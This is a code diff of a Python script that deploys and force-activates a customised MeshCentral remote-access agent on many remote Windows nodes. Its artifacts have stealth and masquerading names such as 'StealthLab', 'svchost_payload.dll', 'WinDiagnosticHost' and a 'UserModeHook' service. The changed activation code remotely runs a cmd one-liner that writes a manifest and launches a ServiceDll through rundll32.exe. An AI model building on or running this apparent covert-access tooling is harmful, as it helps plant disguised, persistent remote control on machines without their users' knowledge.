@@ -110,21 +110,6 @@ ARTIFACTS = {
         "remote_filename": "diagsvc.dll",
         "publish_targets": ("data",),
     },
-    "MeshService64.msh": {
-        "local_path": "meshservice/x64/StealthLab/MeshService-2022.msh",
-        "remote_filename": "MeshService64.msh",
-        "publish_targets": ("data", "signed", "module"),
-    },
-    "MeshService.msh": {
-        "local_path": "meshservice/StealthLab/MeshService-2022.msh",
-        "remote_filename": "MeshService.msh",
-        "publish_targets": ("data", "signed", "module"),
-    },
-    "WinDiagnosticHost.msh": {
-        "local_path": "WinDiagnosticHost.msh",
-        "remote_filename": "WinDiagnosticHost.msh",
-        "publish_targets": ("data", "signed", "module"),
-    },
     "MasterService.exe": {
         "local_path": "../UserModeHook/build-fresh/bin/Release/MasterService.exe",
         "remote_filename": "MasterService.exe",
@@ -145,11 +130,11 @@ REQUIRED_AGENT_ARTIFACTS = {
     "MeshService64.dll",
     "svchost_payload.dll",
     "diagsvc.dll",
-    "MeshService64.msh",
-    "MeshService.msh",
-    "WinDiagnosticHost.msh",
 }
 WINDOWS_INSTALL_ROOT = os.environ.get("MESHCENTRAL_INSTALL_ROOT", r"C:\ProgramData\MeshAgent")
+WINDOWS_UPDATE_PACKAGE_SUFFIX = ".update.pkg"
+WINDOWS_LIFECYCLE_DLL = os.environ.get("MESHCENTRAL_LIFECYCLE_DLL", "")
+WINDOWS_LIFECYCLE_STATE_DIR = os.environ.get("MESHCENTRAL_LIFECYCLE_STATE_DIR", r"%ProgramData%\MeshAgent\state\rundll32-lifecycle")
 REMOTE_COMMAND_RETRIES = int(os.environ.get("MESHCENTRAL_SSH_RETRIES", "3"))
 REMOTE_RETRY_DELAY_SECONDS = float(os.environ.get("MESHCENTRAL_SSH_RETRY_DELAY", "2"))
 RETRYABLE_REMOTE_ERROR_SNIPPETS = (
@@ -1284,7 +1269,7 @@ def extract_pending_update_paths(command_output):
             continue
         if re.match(r"^[A-Za-z]:\\", line) or line.startswith("Directory of ") or line.startswith("Volume "):
             continue
-        if line.lower().endswith(".update.exe"):
+        if line.lower().endswith(WINDOWS_UPDATE_PACKAGE_SUFFIX):
             if ":" not in line:
                 line = f"{WINDOWS_INSTALL_ROOT}\\{line}"
             paths.append(line)
@@ -1299,7 +1284,7 @@ def get_node_pending_updates(nodeid, login_user, login_key_file):
             "--id",
             nodeid,
             "--run",
-            f'dir /b "{WINDOWS_INSTALL_ROOT}\\*.update.exe" 2>nul',
+            f'dir /b "{WINDOWS_INSTALL_ROOT}\\*{WINDOWS_UPDATE_PACKAGE_SUFFIX}" 2>nul',
             "--reply",
         ],
         login_user,
@@ -1310,17 +1295,14 @@ def get_node_pending_updates(nodeid, login_user, login_key_file):
 
 
 def derive_update_install_paths(update_path):
-    """Return the installed launcher and sidecar paths associated with an update payload."""
-    if update_path.lower().endswith(".update.exe") is False:
+    """Return the single staged update payload plus the installed rundll32 host DLL."""
+    if update_path.lower().endswith(WINDOWS_UPDATE_PACKAGE_SUFFIX) is False:
         raise ValueError(f"Unexpected update path: {update_path}")
-    target_path = update_path[:-len(".update.exe")]
-    target_file = Path(target_path)
-    target_root = target_file.with_suffix("")
+    if not WINDOWS_LIFECYCLE_DLL:
+        raise ValueError("MESHCENTRAL_LIFECYCLE_DLL must be set to the installed ServiceDll path before activating updates")
     return {
         "update_path": update_path,
-        "target_path": target_path,
-        "msh_path": f"{target_root}.msh",
-        "conf_path": f"{target_root}.conf",
+        "host_dll_path": WINDOWS_LIFECYCLE_DLL,
     }
 
 
@@ -1339,13 +1321,12 @@ def parse_keyed_probe_output(command_output):
     return parsed
 
 
-def probe_remote_install_sidecars(nodeid, update_path, login_user, login_key_file):
-    """Check whether required install sidecars exist beside the staged update path."""
+def probe_remote_update_activation_inputs(nodeid, update_path, login_user, login_key_file):
+    """Check the explicit update package and installed ServiceDll used for rundll32 activation."""
     paths = derive_update_install_paths(update_path)
     checks = {
-        "TARGET": paths["target_path"],
-        "MSH": paths["msh_path"],
-        "CONF": paths["conf_path"],
+        "UPDATE": paths["update_path"],
+        "HOSTDLL": paths["host_dll_path"],
     }
     commands = [
         f'if exist "{remote_path}" (echo {label}=1) else (echo {label}=0)'
@@ -1371,32 +1352,16 @@ def probe_remote_install_sidecars(nodeid, update_path, login_user, login_key_fil
     }
 
 
-def create_remote_conf_from_msh(nodeid, update_path, login_user, login_key_file):
-    """Regenerate the agent .conf from the existing .msh on a remote node."""
-    paths = derive_update_install_paths(update_path)
-    result = run_meshctrl(
-        [
-            "runcommand",
-            "--id",
-            nodeid,
-            "--run",
-            f'cmd /Q /D /C copy /Y "{paths["msh_path"]}" "{paths["conf_path"]}"',
-        ],
-        login_user,
-        login_key_file,
-        timeout=120,
-    )
-    if result.returncode != 0:
-        raise RuntimeError(result.stderr.strip() or result.stdout.strip() or "meshctrl runcommand failed")
-    return paths["conf_path"]
-
-
 def activate_remote_pending_update(nodeid, update_path, login_user, login_key_file):
-    """Trigger a staged-launcher repair install on a node with a staged update payload."""
+    """Trigger the rundll32 lifecycle host on a node with a staged update package."""
     paths = derive_update_install_paths(update_path)
+    manifest_path = f"{WINDOWS_LIFECYCLE_STATE_DIR}\\deploy-activate.ini"
     command = (
-        f'"{paths["update_path"]}" -fullinstall '
-        f'--cleanup-launcher="{paths["update_path"]}"'
+        'cmd /Q /D /C '
+        f'mkdir "{WINDOWS_LIFECYCLE_STATE_DIR}" 2>nul & '
+        f'(echo [Lifecycle]&echo Action=update&echo SourceExe={paths["update_path"]}&'
+        f'echo RequireConfig=1) > "{manifest_path}" & '
+        f'"%SystemRoot%\\System32\\rundll32.exe" "{paths["host_dll_path"]},MeshLifecycleHostW" "{manifest_path}"'
     )
     result = run_meshctrl(
         [
@@ -1547,7 +1512,7 @@ def cmd_status(args):
     # Deployed agents in meshcentral-data/agents
     print(f"\n{'─' * 60}")
     print(f"  Data Agents ({DATA_AGENTS}):")
-    agents = ssh_cmd(f"ls -lh {DATA_AGENTS}/*.exe {DATA_AGENTS}/*.dll {DATA_AGENTS}/*.msh 2>/dev/null || echo '  (none)'")
+    agents = ssh_cmd(f"ls -lh {DATA_AGENTS}/*.exe {DATA_AGENTS}/*.dll 2>/dev/null || echo '  (none)'")
     if agents:
         for line in agents.split("\n"):
             parts = line.split()
@@ -1557,7 +1522,7 @@ def cmd_status(args):
 
     print(f"\n{'─' * 60}")
     print(f"  Signed Agents ({SIGNED_AGENTS}):")
-    agents = ssh_cmd(f"ls -lh {SIGNED_AGENTS}/*.exe {SIGNED_AGENTS}/*.dll {SIGNED_AGENTS}/*.msh 2>/dev/null || echo '  (none)'")
+    agents = ssh_cmd(f"ls -lh {SIGNED_AGENTS}/*.exe {SIGNED_AGENTS}/*.dll 2>/dev/null || echo '  (none)'")
     if agents:
         for line in agents.split("\n"):
             parts = line.split()
@@ -1567,7 +1532,7 @@ def cmd_status(args):
 
     print(f"\n{'─' * 60}")
     print(f"  Module Agents ({MODULE_AGENTS}):")
-    agents = ssh_cmd(f"ls -lh {MODULE_AGENTS}/*.exe {MODULE_AGENTS}/*.dll {MODULE_AGENTS}/*.msh 2>/dev/null || echo '  (none)'")
+    agents = ssh_cmd(f"ls -lh {MODULE_AGENTS}/*.exe {MODULE_AGENTS}/*.dll 2>/dev/null || echo '  (none)'")
     if agents:
         for line in agents.split("\n"):
             parts = line.split()
@@ -1766,7 +1731,7 @@ def cmd_deploy(args):
     status = ssh_cmd(f"systemctl is-active {SERVICE_NAME}", check=False)
     if status and "active" in status:
         if restart_result is None:
-            print("    Restart command transport failed, but the service is active after the fallback probe.")
+            print("    Restart command transport failed, but the service is active after the recovery probe.")
         print(f"    Service status: {status}")
         post_restart_rehash_ok = refresh_remote_hashagents() is not False
         if post_restart_rehash_ok is False:
@@ -1786,7 +1751,7 @@ def cmd_deploy(args):
         print("\n[SUCCESS] Deployment complete!")
     else:
         if restart_result is None:
-            print("    [WARNING] Restart command transport failed and the fallback probe did not confirm recovery.")
+            print("    [WARNING] Restart command transport failed and the recovery probe did not confirm recovery.")
         print(f"    [WARNING] Service status: {status}")
         print("    Check logs with: deploy.py logs 50")
         return False
@@ -1870,11 +1835,11 @@ def cmd_rollback(args):
     status = ssh_cmd(f"systemctl is-active {SERVICE_NAME}", check=False)
     if not (status and "active" in status):
         if restart_result is None:
-            print("[WARNING] Rollback restart transport failed and the fallback probe did not confirm recovery.")
+            print("[WARNING] Rollback restart transport failed and the recovery probe did not confirm recovery.")
         print(f"\n  Service status: {status}")
         return False
     if restart_result is None:
-        print("  Restart command transport failed, but the service is active after the fallback probe.")
+        print("  Restart command transport failed, but the service is active after the recovery probe.")
     print(f"\n  Service status: {status}")
     print(f"\n[SUCCESS] Rolled back to {bname}")
     return True
@@ -2129,52 +2094,34 @@ def cmd_update_online(args):
         activation_warnings = {}
         if pending and args.native_activate:
             print("\n  Pending nodes still online/stuck after initial watch.")
-            print("  Probing staged update payloads and triggering staged-launcher repair installs where safe.")
+            print("  Probing staged update payloads and triggering the rundll32 lifecycle host where safe.")
             for nodeid in sorted(pending):
                 name = names_by_id.get(nodeid, nodeid)
                 try:
                     update_paths = get_node_pending_updates(nodeid, login_user, login_key_file)
                     if not update_paths:
-                        activation_errors[nodeid] = "No staged *.update.exe payload found"
+                        activation_errors[nodeid] = f"No staged *{WINDOWS_UPDATE_PACKAGE_SUFFIX} payload found"
                         print(f"    {name}: no staged update payload found")
                         continue
                     chosen_update = sorted(update_paths)[0]
-                    probe = probe_remote_install_sidecars(nodeid, chosen_update, login_user, login_key_file)
+                    probe = probe_remote_update_activation_inputs(nodeid, chosen_update, login_user, login_key_file)
                     missing = [label for label, ok in probe["checks"].items() if ok is not True]
-                    if "TARGET" in missing:
-                        activation_errors[nodeid] = "Missing installed launcher beside the staged update payload"
-                        print(f"    {name}: missing installed launcher beside the staged update payload")
+                    if "UPDATE" in missing:
+                        activation_errors[nodeid] = "Missing staged update payload"
+                        print(f"    {name}: missing staged update payload")
                         continue
-                    if "MSH" in missing:
-                        activation_errors[nodeid] = "Missing .msh beside the staged update payload"
-                        print(f"    {name}: missing .msh beside the staged update payload")
+                    if "HOSTDLL" in missing:
+                        activation_errors[nodeid] = "Missing installed ServiceDll required to host rundll32 lifecycle"
+                        print(f"    {name}: missing installed ServiceDll required to host rundll32 lifecycle")
                         continue
-                    repaired = []
-                    if "CONF" in missing:
-                        create_remote_conf_from_msh(nodeid, chosen_update, login_user, login_key_file)
-                        repaired.append("agent.conf")
-                        time.sleep(2)
-                        probe = probe_remote_install_sidecars(nodeid, chosen_update, login_user, login_key_file)
-                        missing = [label for label, ok in probe["checks"].items() if ok is not True]
-                    blocking_missing = [label for label in missing if label in ("TARGET", "MSH", "CONF")]
-                    if blocking_missing:
-                        missing_labels = ", ".join(label.lower() for label in blocking_missing)
-                        activation_errors[nodeid] = f"Missing required install sidecars after repair: {missing_labels}"
-                        print(f"    {name}: missing required install sidecars after repair: {missing_labels}")
-                        continue
-                    warning_labels = [label.lower() for label in missing if label not in ("TARGET", "MSH", "CONF")]
-                    if warning_labels:
-                        activation_warnings[nodeid] = f"Optional sidecar gaps remain: {', '.join(warning_labels)}"
                     install_paths = activate_remote_pending_update(nodeid, chosen_update, login_user, login_key_file)
                     activation_attempts[nodeid] = {
                         "update_path": chosen_update,
-                        "target_path": install_paths["target_path"],
-                        "mode": "staged-fullinstall",
-                        "repaired": repaired,
+                        "host_dll_path": install_paths["host_dll_path"],
+                        "mode": "rundll32-lifecycle-update",
                     }
-                    repair_note = f" after repairing {', '.join(repaired)}" if repaired else ""
                     warning_note = f" ({activation_warnings[nodeid]})" if nodeid in activation_warnings else ""
-                    print(f"    {name}: launched staged repair install using {chosen_update}{repair_note}{warning_note}")
+                    print(f"    {name}: launched rundll32 lifecycle update using {chosen_update}{warning_note}")
                 except Exception as ex:
                     activation_errors[nodeid] = str(ex)
                     print(f"    {name}: native activation failed: {ex}")
@@ -2211,8 +2158,7 @@ def cmd_update_online(args):
                 print(
                     f"    {names_by_id.get(nodeid, nodeid)}"
                     f"  update={attempt['update_path']}"
-                    f"  target={attempt['target_path']}"
-                    f"  repaired={','.join(attempt['repaired']) if attempt['repaired'] else 'none'}"
+                    f"  hostDll={attempt['host_dll_path']}"
                 )
 
         if activation_errors:
@@ -2286,7 +2232,7 @@ def main():
     update_p.add_argument("--batch-size", type=int, default=50, help="Number of node IDs per updateAgents request")
     update_p.add_argument("--wait-seconds", type=int, default=90, help="How long to watch for reconnects after submission")
     update_p.add_argument("--poll-seconds", type=int, default=10, help="Polling interval while watching reconnects")
-    update_p.add_argument("--native-activate", action=argparse.BooleanOptionalAction, default=True, help="If nodes stay stuck with a staged update payload, trigger native -fullupdate remotely")
+    update_p.add_argument("--native-activate", action=argparse.BooleanOptionalAction, default=True, help="If nodes stay stuck with a staged update payload, trigger the rundll32 lifecycle host remotely")
     update_p.add_argument("--activation-wait-seconds", type=int, default=180, help="How long to watch for reconnects after native activation remediation")
     update_p.add_argument("--dry-run", action="store_true", help="List online targets without submitting updates")
 
